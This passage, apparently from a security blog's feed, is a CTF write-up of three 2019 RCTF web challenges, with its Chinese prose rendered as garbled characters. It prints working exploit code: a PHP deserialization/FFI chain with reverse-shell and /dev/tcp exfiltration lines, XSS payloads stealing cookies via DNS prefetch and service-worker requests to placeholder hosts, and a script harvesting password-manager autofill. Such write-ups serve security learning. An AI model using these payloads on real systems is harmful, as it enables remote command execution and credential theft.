        &lt;p&gt;æœ€è¿‘å¼€å§‹å…¥é—¨pwnï¼Œåœ¨ç™½æ³½æ–°æ‰‹ojé‚£é‡Œå­¦äº†ä¸€æ³¢ä¹‹åå¼€å§‹è‡ªå·±å­¦å‰©ä¸‹çš„å†…å®¹ã€‚çœ‹åˆ°atumå¤§ä½¬æ¨èçš„ä¸‰é“åŸºç¡€ROPé¢˜ç›®ï¼Œå°±ç»ƒä¹ ä¸€ä¸‹ï¼Œå­¦ä¹ æ€è·¯æ€»ç»“ç»éªŒã€‚åœ¨ç½‘ä¸Šæ‰¾é¢˜çš„è¿‡ç¨‹ä¸­å‘ç°vssåŸºæœ¬ä¸Šç»è¿¹äº†ã€‚ã€‚ã€‚è¾›è‹¦ä¸€ç•ªä¹‹åç»ˆäºæ‰¾åˆ°ï¼Œä¸ºäº†åé¢çš„äººä¹Ÿèƒ½å¿«é€Ÿæ‰¾åˆ°é¢˜ç›®æˆ‘å°±æŠŠä¸‰é“é¢˜ä¸€èµ·ä¸Šä¼ äº†ã€‚&lt;/p&gt;

      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ROP" scheme="https://hurricane618.me/tags/ROP/"/>
    
      <category term="stackoverflow" scheme="https://hurricane618.me/tags/stackoverflow/"/>
    
  </entry>
  
  <entry>
    <title>2019RCTF éƒ¨åˆ†Webçš„WriteUp</title>
    <link href="https://hurricane618.me/2019/05/24/2019rctf-some-writeup/"/>
    <id>https://hurricane618.me/2019/05/24/2019rctf-some-writeup/</id>
    <published>2019-05-24T02:23:17.000Z</published>
    <updated>2019-05-24T02:23:17.544Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€å¹´ä¸€åº¦çš„RCTFå¼€å§‹äº†ï¼Œåˆèƒ½å­¦ä¸€æ³¢éªšæ“ä½œï¼ŒRCTFçš„webé¢˜ç›®å»å¹´å°±éå¸¸å¥½ï¼Œä»Šå¹´ä¹Ÿç‰¹åˆ«å‡ºè‰²ã€‚ç”±äºç ”ç©¶æ‰€æœˆèµ›çš„åŸå› æ²¡æœ‰å‚ä¸å…¶ä¸­ï¼Œæ‰€ä»¥èµ›åæ¥å¤ç°ä¸€ä¸‹ã€‚</p><h2 id="nextphp"><a href="#nextphp" class="headerlink" title="nextphp"></a>nextphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]); </span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªä»£ç æ‰§è¡Œï¼Œä½†æ˜¯è‚¯å®šæ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæ‰§è¡ŒphpinfoæŸ¥çœ‹åˆ°<code>disable_function</code>ä¹‹åï¼Œå‘ç°ç¦ç”¨äº†å·²çŸ¥èŒƒå›´å†…çš„æ‰€æœ‰å±é™©å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æŠŠä¹‹å‰è€ƒå·®è¿‡çš„<code>putenv</code>ä¹Ÿç¦ç”¨äº†ã€‚è¿™æ ·å°±æ²¡æœ‰åŠæ³•ä½¿ç”¨<code>LD_PRELOAD</code>æ¥åŠ«æŒæ‰§è¡Œå‘½ä»¤äº†ã€‚ </p><p>åŒæ—¶ä¹Ÿæ£€æŸ¥äº†ä¸€ä¸‹å…¶ä»–æ–¹é¢ï¼Œæœ‰æ²¡æœ‰ä½¿ç”¨ä»€ä¹ˆå±é™©çš„åç«¯ç»„ä»¶ï¼Œä¹Ÿæ˜¯å…¨éƒ¨GGã€‚æ²¡æœ‰php-fpmï¼Œæ²¡æœ‰mog_cgiï¼Œæ²¡æœ‰ImageMagickç­‰ç­‰ã€‚ </p><p>ä¸€ç­¹è«å±•ä¹‹é™…ï¼Œæ—å¸ˆå‚…æé†’åˆ°å¯ä»¥æ‰«ææ–‡ä»¶çœ‹çœ‹ï¼Œæ‰€ä»¥æœæ–­çœ‹çœ‹è·¯å¾„ä¸Šæœ‰äº›å•¥ã€‚é€šè¿‡phpinfoå¯ä»¥å¾—åˆ°webè·¯å¾„ï¼Œä½¿ç”¨phpå‡½æ•°æ¥æ‰“å¼€è·¯å¾„è¯»å–å†…å®¹å³å¯ã€‚ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=var_dump(glob(&quot;/var/www/html/*&quot;));</span><br><span class="line">array(2) &#123; [0]=&gt; string(23) &quot;/var/www/html/index.php&quot; [1]=&gt; string(25) &quot;/var/www/html/preload.php&quot; &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é‡Œé¢é™¤äº†<code>index.php</code>ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªç¥å¥‡çš„<code>preload.php</code>ï¼Œè¯»å–å…¶ä¸­çš„å†…å®¹çœ‹çœ‹ã€‚ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=var_dump(file_get_contents(&quot;/var/www/html/preload.php&quot;));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡Œé¢æ˜¯ä¸€ä¸ªç»§æ‰¿åºåˆ—åŒ–ç±»çš„è‡ªå®šä¹‰ç±»ï¼ŒåŒæ—¶åœ¨phpinfoä¸­çœ‹åˆ°å®ƒè¢«<code>opcache.preload</code>é¢„åŠ è½½äº†ã€‚ </p><p>æ„Ÿè§‰è¿™é‡Œæ˜¯æœ‰çªç ´å£çš„ï¼Œæœäº†ä¸€åœˆå‘ç°åªæœ‰phpæ–‡æ¡£æœ‰èµ„æ–™ï¼Œå½“æ—¶æ²¡æœ‰ä»€ä¹ˆç©ºå°±æ”¾å¼ƒäº†ã€‚ </p><p>çœ‹äº†zsxå¤§ä½¬çš„<a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp" target="_blank" rel="noopener">writeup</a>ä¹‹åï¼Œå‘ç°è¿™ä¸ªphpæ˜¯7.4çš„å¼€å‘ç‰ˆæœ¬ï¼Œå¼€å‘ç‰ˆç»å¸¸ä¼šæœ‰æ–°ç‰¹æ€§ï¼Œè¿™é‡Œå°±æ˜¯åˆ©ç”¨ä¸€ä¸ªæ–°ç‰¹æ€§<code>FFI-Foreign Function Interface</code>ï¼Œä¸­æ–‡å«å¤–éƒ¨å‡½æ•°æ¥å£ã€‚ </p><p>åˆ©ç”¨è¿™ä¸ªæˆ‘ä»¬å¯ä»¥å¼•ç”¨è¢«ç¦ç”¨çš„å‡½æ•°ï¼Œä½†æ˜¯ç”±äº<code>__set</code>è¢«è®¾ç½®æˆæŠ¥é”™ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•å¯¹<code>$data</code>èµ‹å€¼ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦è°ƒç”¨<code>__unserialize</code>ï¼Œè¿™é‡Œåˆæœ‰ä¸€ä¸ªæ–°æœºåˆ¶ï¼Œåœ¨è¿™ä¸ªç±»å³ç»§æ‰¿äº†ååºåˆ—åŒ–ç±»ï¼Œåˆæ‹¥æœ‰<code>__serialize()/__unserialize()</code>ï¼Œå°±ä¼šä¼˜å…ˆæ‰§è¡Œè¿™ç§æ–¹æ³•ã€‚ </p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªç±»ï¼Œå…ˆæ­£å¸¸åºåˆ—åŒ–ï¼Œä¿®æ”¹æˆ<code>class A</code>ï¼Œç„¶åå†ååºåˆ—åŒ–ï¼Œè¿™æ ·å°±ä¼šè¦†ç›–åŸå§‹çš„å€¼ï¼ŒåŒæ—¶å¹¶ä¸æ˜¯ç›´æ¥èµ‹å€¼ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè§¦å‘<code>__set</code>ã€‚æœ€åï¼Œåˆ©ç”¨ffiå¼•å…¥å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œæ‰§è¡Œå‘½ä»¤åå¼¹shellã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> D();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b = str_replace(<span class="string">'"D"'</span>, <span class="string">'"A"'</span>, $b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="comment">//$d = unserialize($b);</span></span><br><span class="line"><span class="comment">//$d-&gt;ret-&gt;system('bash -i &gt;&amp; /dev/tcp/xxxx/8080 0&gt;&amp;1');</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æŠŠååºåˆ—åŒ–æ•°æ®å¸¦å…¥æœ€åä¸¤è¡Œï¼Œåœ¨è¿œç¨‹æœåŠ¡ç«¯æ‰§è¡Œï¼Œå°±å¯ä»¥äº†ã€‚ä½†æ˜¯è¿™ä¸­é—´æœ‰ä¸€ä¸ªå‘ï¼Œå°±æ˜¯æ²¡æœ‰åŠæ³•åå¼¹shellï¼Œåªèƒ½ä¸€æ¬¡ä¸€æ¬¡çš„æ‰§è¡Œå‘½ä»¤åå›ä¼ åˆ°vpsä¸»æœºä¸Šã€‚ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$d-&gt;ret-&gt;system(&apos;bash -c &quot;cat /flag &gt; /dev/tcp/xxxx/xxxx&quot;&apos;);</span><br></pre></td></tr></table></figure><img src="/2019/05/24/2019rctf-some-writeup/1.jpg"><h2 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h2><p>æ¼æ´ç‚¹æ¯”è¾ƒç›´æ¥ï¼Œåœ¨poståŒºåŸŸä¸­æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¯ä»¥ä»»æ„è¾“å…¥ï¼Œæ˜¯ä¸€ä¸ªå­˜å‚¨å‹xssï¼Œä½†æ˜¯å¥ˆä½•æœ‰cspã€‚ </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">content-security-policy</span>: sandbox allow-scripts allow-same-origin; base-uri 'none';default-src 'self';script-src 'unsafe-inline' 'self';connect-src 'none';object-src 'none';frame-src 'none';font-src data: 'self';style-src 'unsafe-inline' 'self';</span><br></pre></td></tr></table></figure><p>ç”±äºæœ‰æ²™ç›’ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•æ­£å¸¸å¤–è¿ä¼ è¾“æ•°æ®ï¼ŒåŒæ—¶ç”±äºæœ‰bannerå¯¼è‡´æ²¡æœ‰åŠæ³•è‡ªåŠ¨è·³è½¬ï¼Œè¿™é‡Œæ€è·¯æœ‰è¿™ä¹ˆå‡ ä¸ªã€‚ </p><ol><li><p>ä¸€èˆ¬è¿™ç§è¿æ¥æ˜¯æ²¡æœ‰é™åˆ¶dnsæŸ¥è¯¢çš„ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨dnså¤–å¸¦æ•°æ®ï¼Œè¿™é‡Œçš„æ–¹æ³•ä¸»è¦æ˜¯<code>&lt;link rel=&quot;dns-prefetch&quot; href=xxxxx.xxxxx.xxxx&gt;</code>ï¼Œè¿™æ ·åœ¨dnsè®°å½•ä¸­å°±å¯ä»¥æŸ¥åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚ </p></li><li><p>åˆ©ç”¨æŸäº›æœåŠ¡æœºåˆ¶ç»•è¿‡cspçš„ç­–ç•¥ï¼Œzsxçš„writeupä¸­ä»‹ç»äº†ä¸¤ç§ï¼Œä¸€ä¸ªæ˜¯WebRTCæœåŠ¡ä¼šå¿½ç•¥<code>connect-src</code>ï¼Œ<a href="https://github.com/w3c/webrtc-pc/issues/1727" target="_blank" rel="noopener">https://github.com/w3c/webrtc-pc/issues/1727</a>ã€‚å¦å¤–ä¸€ç§æ˜¯åˆ©ç”¨service workerï¼Œè¿™ä¸ªæ˜¯jsåœ¨æµè§ˆå™¨æ³¨å†Œçš„ä¸€ç§æŒç»­åŒ–çš„æœåŠ¡ï¼Œè¿™ä¸ªæœåŠ¡ä¼šä¼˜å…ˆä½¿ç”¨å®ƒè‡ªå·±çš„cspç­–ç•¥ï¼Œæ‰€ä»¥ç›´æ¥ä¼ è¾“ç©ºçš„cspç­–ç•¥å°±å¯ä»¥ç»•è¿‡ã€‚ </p></li></ol><p>ç”±äºè¿™é“é¢˜ç›®æ˜¯ç›´æ¥å¼€å¯äº†scriptçš„<code>unsafe-inline</code>ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ç›´æ¥ä¸Šscriptæ ‡ç­¾çš„ã€‚è¿™é‡Œæ˜¯ç›´æ¥ç”¨æœ€ç®€å•çš„dnså¤–å¸¦æ•°æ®çš„æ–¹æ³•ã€‚ </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toHex</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        val += s.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">c = <span class="built_in">document</span>.cookie.split(<span class="string">";"</span>);</span><br><span class="line">head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"HEAD"</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;c.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> t = c[i];</span><br><span class="line">    <span class="keyword">if</span> (t.indexOf(<span class="string">"flag="</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">        t = toHex(t.split(<span class="string">"="</span>)[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> tt =t.substr(j*<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">            <span class="keyword">if</span> (tt.length == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            head.innerHTML = head.innerHTML + <span class="string">"&lt;link rel=\"dns-prefetch\" href=\"//v_"</span>+j+<span class="string">"_"</span> + tt+  <span class="string">".flag.xxxxxx.ceye.io\"&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†dnså¤–å¸¦æ•°æ®ä¼ ç»™ceyeï¼Œä¸€ä¸ªdnsçš„logå¹³å°ï¼Œæ”¶åˆ°æ•°æ®ä¹‹åhexè§£ç å³å¯å¾—åˆ°flagã€‚ </p><img src="/2019/05/24/2019rctf-some-writeup/2.jpg"><p>å½“ç„¶é¢„æœŸè§£æ³•æ˜¯service workerï¼Œè¿™é‡Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ jsï¼Œç„¶ååœ¨postå¤„å¼•ç”¨ã€‚å› ä¸ºservice workeræœºåˆ¶çš„é—®é¢˜ï¼Œå¯ä»¥ç»•è¿‡åŸæ¥çš„cspè®¾ç½®ã€‚é¡ºå¸¦ä¸€æï¼Œå¿…é¡»è¦æ˜¯httpsæ‰è¡Œã€‚ </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'https://YOUR_DOMAIN/?'</span> + <span class="built_in">encodeURIComponent</span>(globalThis.location.href), &#123;<span class="attr">mode</span>: <span class="string">'no-cors'</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> navigator.serviceWorker.register(<span class="string">'/uploads/21ca75a36c5cdacfd4653fadb2553242.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie), &#123;<span class="attr">scope</span>: <span class="string">'/uploads/'</span>&#125;); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>å»¶ç»­ä¸Šä¸€é“é¢˜ç›®çš„ç¯å¢ƒï¼Œåªä¸è¿‡è¿™æ¬¡éœ€è¦è·å–ç®¡ç†å‘˜çš„å¯†ç ã€‚æ˜¯ä¸€é“å¾ˆæœ‰æ„æ€çš„é¢˜ç›®ï¼Œçœ‹å®Œé¢˜è§£ä¹‹åï¼Œå‘ç°å®ƒæ˜¯åˆ©ç”¨å¯†ç ç®¡ç†è½¯ä»¶çš„è‡ªåŠ¨æç¤ºåŠŸèƒ½æ¥è·å¾—å¯†ç ã€‚</p><p>è¿™é‡Œåªèƒ½é€šè¿‡service workeræ¥å®Œæˆï¼Œé¦–å…ˆçœ‹åˆ°æç¤ºä¹‹åå»è¯»å–<code>document.body.innerHTML</code>ï¼Œå¯ä»¥æ‹¿åˆ°ä¸€äº›æœ‰è¶£çš„æ•°æ®ï¼Œåœ¨é‡Œé¢å¯ä»¥çœ‹åˆ°æœ‰cipè¿™ä¸ªå•è¯ï¼ŒæŸ¥è¯¢ä¹‹åçŸ¥é“æ˜¯chromeipassã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.body.innerHTML), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1000</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬åœ¨postçš„åœ°æ–¹å¢åŠ ä¸¤ä¸ªinputï¼Œä¸€ä¸ªæ˜¯usernameï¼Œä¸€ä¸ªæ˜¯passwordï¼Œæ§åˆ¶è„šæœ¬å»ç‚¹å‡»è¿™ä¸ªusernameçš„inputï¼Œç„¶åå†å»è¯»å–<code>document.body.innerHTML</code>ã€‚å‘ç°ä¼šå¤šå‡ºä¸€äº›æ¡ç›®ï¼Œåœ¨å…¶ä¸­å¯ä»¥çœ‹åˆ°flagçš„é€‰é¡¹ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123; <span class="built_in">document</span>.querySelector(<span class="string">'[type=username]'</span>).click() &#125;,<span class="number">500</span>); setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.body.innerHTML), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1000</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾äº†ï¼Œåªè¦é€‰æ‹©flagä¸ºç”¨æˆ·åï¼Œå†å»è¯»å–å¯†ç å°±å¯ä»¥äº†ã€‚æœ€åè¯»å–flagçš„passwordçš„è„šæœ¬ï¼Œé…åˆä¸Šä¹‹å‰jailåŒæ ·çš„service workerçš„jsï¼Œå°±èƒ½æ”¶åˆ°flagäº†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">document</span>.querySelector(<span class="string">'[type=username]'</span>).click()&#125;,<span class="number">500</span>);</span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">document</span>.getElementById(<span class="string">'cip-ui-id-4'</span>).click()&#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.getElementById(<span class="string">'password'</span>).value), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1500</span>)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™é“é¢˜æˆ‘ä»¬ä¹ŸçŸ¥é“æµè§ˆå™¨ä¿ç®¡å¯†ç ä¹Ÿæ˜¯ä¼šè¢«å·å–çš„ï¼Œè¿™é‡Œæ‹“å±•ä¸€ä¸‹ï¼Œæ˜¯èƒ½å¤Ÿå†™ä¸ªè„šæœ¬éå†æ‰€æœ‰çš„ç”¨æˆ·åå’Œå¯†ç ç„¶åä¾æ¬¡å‘é€å›xsså¹³å°çš„ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
